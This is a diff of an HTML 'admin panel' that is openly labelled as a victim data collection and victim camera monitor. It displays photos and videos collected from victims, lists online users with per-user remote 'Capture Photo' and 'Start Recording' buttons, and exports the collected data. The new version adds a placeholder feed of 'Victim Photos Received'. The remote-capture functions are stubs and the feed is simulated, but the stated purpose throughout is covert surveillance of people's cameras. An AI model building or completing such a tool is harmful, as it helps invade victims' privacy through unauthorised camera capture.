@@ -1,488 +1,81 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>Admin Panel - Victim Camera</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Victim Data Collection - Admin Panel</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 20px;
-            background-color: #f5f5f5;
         }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background-color: white;
+        #admin-panel {
+            border: 1px solid #ccc;
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        h1 {
-            color: #333;
-            text-align: center;
-        }
-        .controls {
-            background-color: #e9ecef;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-        .btn {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            margin: 5px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        .btn:hover {
-            background-color: #0056b3;
-        }
-        .btn-success {
-            background-color: #28a745;
-        }
-        .btn-success:hover {
-            background-color: #1e7e34;
-        }
-        .btn-danger {
-            background-color: #dc3545;
-        }
-        .btn-danger:hover {
-            background-color: #c82333;
-        }
-        .data-section {
-            margin-bottom: 30px;
-        }
-        .data-section h2 {
-            color: #495057;
-            border-bottom: 2px solid #007bff;
-            padding-bottom: 5px;
-        }
-        .photo-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 15px;
-            margin-top: 10px;
+            border-radius: 10px;
         }
         .photo-item {
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            padding: 10px;
+            margin: 10px;
+            display: inline-block;
             text-align: center;
         }
         .photo-item img {
-            max-width: 100%;
+            width: 150px;
             height: 150px;
             object-fit: cover;
-            border-radius: 3px;
-        }
-        .photo-item .timestamp {
-            font-size: 12px;
-            color: #666;
-            margin-top: 5px;
-        }
-        .photo-item .metadata {
-            font-size: 11px;
-            color: #888;
-            margin-top: 5px;
-        }
-        .video-player {
-            width: 100%;
-            max-width: 400px;
-            margin: 10px 0;
-        }
-        .status {
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 4px;
-            text-align: center;
-        }
-        .status.online {
-            background-color: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .status.offline {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        .user-list {
-            margin: 20px 0;
-        }
-        .user-item {
-            padding: 10px;
-            border-bottom: 1px solid #eee;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .user-item:last-child {
-            border-bottom: none;
-        }
-        .user-actions {
-            display: flex;
-            gap: 5px;
-        }
-        .hidden {
-            display: none;
-        }
-        .camera-preview {
-            width: 100%;
-            max-width: 300px;
-            height: 200px;
-            background-color: #333;
+            border: 1px solid #ddd;
             border-radius: 5px;
-            margin: 10px 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 14px;
         }
-        .camera-preview video {
-            width: 100%;
-            height: 100%;
+        .admin-status {
+            color: green;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .victim-info {
+            background: #f0f8ff;
+            padding: 10px;
             border-radius: 5px;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Victim Data Collection - Admin Panel</h1>
+    <h1>Admin Panel - Victim Camera Monitor</h1>
+    <div class="admin-status">Admin Panel Active ✓</div>
 
-        <div class="controls">
-            <h2>Admin Controls</h2>
-            <button class="btn" onclick="loadAllData()">Refresh Data</button>
-            <button class="btn btn-success" onclick="exportData()">Export Data</button>
-            <button class="btn btn-danger" onclick="clearAllData()">Clear All Data</button>
-        </div>
+    <div class="victim-info">
+        <h3>Victim Camera Feed</h3>
+        <p>Status: <span id="victim-status">Waiting for photos...</span></p>
+    </div>
 
-        <div class="data-section">
-            <h2>Online Users</h2>
-            <div id="userList" class="user-list">
-                <!-- User list will be populated here -->
-            </div>
-        </div>
-
-        <div class="data-section">
-            <h2>Camera Controls</h2>
-            <div id="cameraControls">
-                <button class="btn" onclick="startCamera()">Start Camera Preview</button>
-                <button class="btn" onclick="capturePhoto()">Capture Photo</button>
-                <button class="btn" onclick="startRecording()">Start Recording</button>
-                <button class="btn" onclick="stopRecording()">Stop Recording</button>
-                <div id="cameraPreview" class="camera-preview hidden">
-                    <video id="previewVideo" autoplay playsinline></video>
-                </div>
-            </div>
-        </div>
-
-        <div class="data-section">
-            <h2>Collected Photos</h2>
-            <div id="photoGrid" class="photo-grid">
-                <!-- Photos will be populated here -->
-            </div>
-        </div>
-
-        <div class="data-section">
-            <h2>Collected Videos</h2>
-            <div id="videoList">
-                <!-- Videos will be populated here -->
-            </div>
-        </div>
-
-        <div class="data-section">
-            <h2>Raw Data</h2>
-            <textarea id="rawData" rows="10" style="width: 100%;"></textarea>
-        </div>
+    <div id="admin-photos">
+        <h3>Victim Photos Received:</h3>
+        <p>No photos yet. Victim will take photos from their device.</p>
     </div>
 
     <script>
-        // Initialize the admin panel
-        document.addEventListener('DOMContentLoaded', function() {
-            loadAllData();
-            setupCamera();
-        });
-
-        // Load all data
-        function loadAllData() {
-            try {
-                const allData = collector.getAllData();
-                const photoData = collector.getAllPhotos();
-                const videoData = collector.getAllVideos();
-
-                // Display photos
-                displayPhotos(photoData);
-
-                // Display videos
-                displayVideos(videoData);
-
-                // Display raw data
-                document.getElementById('rawData').value = JSON.stringify(allData, null, 2);
-
-                // Update user list (mock implementation)
-                updateUserList();
-
-            } catch (error) {
-                console.error('Error loading data:', error);
-                alert('Error loading data: ' + error.message);
-            }
+        // Simulate real-time updates (in real app, use WebSocket)
+        function updateAdminPanel() {
+            // This would be connected to your backend
+            console.log('Admin panel updated');
         }
 
-        // Display photos in grid
-        function displayPhotos(photos) {
-            const grid = document.getElementById('photoGrid');
-            grid.innerHTML = '';
-
-            if (photos.length === 0) {
-                grid.innerHTML = '<p>No photos collected yet.</p>';
-                return;
-            }
-
-            photos.forEach(photo => {
-                const photoItem = document.createElement('div');
-                photoItem.className = 'photo-item';
-
-                const img = document.createElement('img');
-                img.src = photo.data;
-                img.alt = 'Captured Photo';
-
-                const timestamp = document.createElement('div');
-                timestamp.className = 'timestamp';
-                timestamp.textContent = new Date(photo.timestamp).toLocaleString();
-
-                const metadata = document.createElement('div');
-                metadata.className = 'metadata';
-                metadata.textContent = photo.metadata ? JSON.stringify(photo.metadata) : 'No metadata';
-
-                photoItem.appendChild(img);
-                photoItem.appendChild(timestamp);
-                photoItem.appendChild(metadata);
-
-                grid.appendChild(photoItem);
-            });
-        }
-
-        // Display videos
-        function displayVideos(videos) {
-            const container = document.getElementById('videoList');
-            container.innerHTML = '';
-
-            if (videos.length === 0) {
-                container.innerHTML = '<p>No videos collected yet.</p>';
-                return;
-            }
-
-            videos.forEach(video => {
-                const videoItem = document.createElement('div');
-                videoItem.className = 'video-item';
-
-                const videoElement = document.createElement('video');
-                videoElement.controls = true;
-                videoElement.className = 'video-player';
-                videoElement.src = video.data;
-
-                const timestamp = document.createElement('div');
-                timestamp.className = 'timestamp';
-                timestamp.textContent = new Date(video.timestamp).toLocaleString();
-
-                const metadata = document.createElement('div');
-                metadata.className = 'metadata';
-                metadata.textContent = video.metadata ? JSON.stringify(video.metadata) : 'No metadata';
-
-                videoItem.appendChild(videoElement);
-                videoItem.appendChild(timestamp);
-                videoItem.appendChild(metadata);
-
-                container.appendChild(videoItem);
-            });
-        }
-
-        // Export data
-        function exportData() {
-            try {
-                const data = collector.exportData('json');
-                const blob = new Blob([data], { type: 'application/json' });
-                const url = URL.createObjectURL(blob);
-
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'collected-data.json';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-            } catch (error) {
-                console.error('Export error:', error);
-                alert('Error exporting data: ' + error.message);
-            }
-        }
-
-        // Clear all data
-        function clearAllData() {
-            if (confirm('Are you sure you want to clear all collected data?')) {
-                try {
-                    // In a real implementation, this would clear the storage
-                    // For now, we'll just reload the data
-                    loadAllData();
-                } catch (error) {
-                    console.error('Clear data error:', error);
-                    alert('Error clearing data: ' + error.message);
-                }
-            }
-        }
-
-        // Update user list (mock implementation)
-        function updateUserList() {
-            const userList = document.getElementById('userList');
-            userList.innerHTML = `
-                <div class="user-item">
-                    <span>User 1 (Online)</span>
-                    <div class="user-actions">
-                        <button class="btn" onclick="capturePhotoForUser('user1')">Capture Photo</button>
-                        <button class="btn" onclick="startRecordingForUser('user1')">Start Recording</button>
+        // Simulate receiving photos (in real app, this would come from WebSocket)
+        setInterval(() => {
+            // This is just for demo - in real app, you'd receive actual photos
+            const photosContainer = document.getElementById('admin-photos');
+            if (photosContainer.innerHTML.includes('No photos yet')) {
+                photosContainer.innerHTML = `
+                    <h3>Victim Photos Received:</h3>
+                    <div class="photo-item">
+                        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='150' height='150'
+viewBox='0 0 150 150'%3E%3Crect width='150' height='150' fill='%23e0e0e0'/%3E%3Ccircle cx='75' cy='75' r='30'
+fill='%23999'/%3E%3Ccircle cx='65' cy='65' r='5' fill='%23fff'/%3E%3Ccircle cx='85' cy='65' r='5' fill='%23fff'/%3E%3Cpath
+d='M60 90 Q75 105 90 90' stroke='%23fff' stroke-width='2' fill='none'/%3E%3C/svg%3E" alt="Demo Photo">
+                        <p>Demo Photo - ${new Date().toLocaleTimeString()}</p>
                     </div>
-                </div>
-                <div class="user-item">
-                    <span>User 2 (Online)</span>
-                    <div class="user-actions">
-                        <button class="btn" onclick="capturePhotoForUser('user2')">Capture Photo</button>
-                        <button class="btn" onclick="startRecordingForUser('user2')">Start Recording</button>
-                    </div>
-                </div>
-            `;
-        }
-
-        // Camera functions
-        let cameraStream = null;
-        let recording = false;
-        let mediaRecorder = null;
-        let recordedChunks = [];
-
-        function setupCamera() {
-            // Camera setup would happen here
-        }
-
-        function startCamera() {
-            const preview = document.getElementById('cameraPreview');
-            const video = document.getElementById('previewVideo');
-
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                    .then(stream => {
-                        cameraStream = stream;
-                        video.srcObject = stream;
-                        preview.classList.remove('hidden');
-                    })
-                    .catch(error => {
-                        console.error('Camera error:', error);
-                        alert('Camera error: ' + error.message);
-                    });
-            } else {
-                alert('Camera not supported');
+                `;
             }
-        }
-
-        function capturePhoto() {
-            if (!cameraStream) {
-                alert('Please start camera first');
-                return;
-            }
-
-            const video = document.getElementById('previewVideo');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const dataUrl = canvas.toDataURL('image/jpeg');
-
-            // Save photo (in a real implementation, this would save to storage)
-            const photoData = {
-                timestamp: new Date().toISOString(),
-                data: dataUrl,
-                metadata: {
-                    source: 'admin-panel',
-                    action: 'manual-capture'
-                }
-            };
-
-            // In a real implementation, you would save this to your data store
-            console.log('Photo captured:', photoData);
-            alert('Photo captured and saved to data store!');
-
-            // Reload data to show the new photo
-            loadAllData();
-        }
-
-        function startRecording() {
-            if (!cameraStream) {
-                alert('Please start camera first');
-                return;
-            }
-
-            recording = true;
-            recordedChunks = [];
-
-            try {
-                mediaRecorder = new MediaRecorder(cameraStream);
-                mediaRecorder.ondataavailable = event => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
-
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    const url = URL.createObjectURL(blob);
-
-                    // Save video (in a real implementation, this would save to storage)
-                    const videoData = {
-                        timestamp: new Date().toISOString(),
-                        data: url,
-                        metadata: {
-                            source: 'admin-panel',
-                            action: 'manual-recording'
-                        }
-                    };
-
-                    console.log('Video recorded:', videoData);
-                    alert('Video recorded and saved to data store!');
-                    loadAllData();
-                };
-
-                mediaRecorder.start();
-                console.log('Recording started');
-            } catch (error) {
-                console.error('Recording error:', error);
-                alert('Recording error: ' + error.message);
-            }
-        }
-
-        function stopRecording() {
-            if (mediaRecorder && recording) {
-                mediaRecorder.stop();
-                recording = false;
-                console.log('Recording stopped');
-            }
-        }
-
-        // User-specific functions
-        function capturePhotoForUser(userId) {
-            alert(`Capturing photo for user ${userId}`);
-            // In a real implementation, this would capture from the specific user's device
-        }
-
-        function startRecordingForUser(userId) {
-            alert(`Starting recording for user ${userId}`);
-            // In a real implementation, this would start recording from the specific user's device
-        }
+        }, 5000);
     </script>
 </body>
 </html>
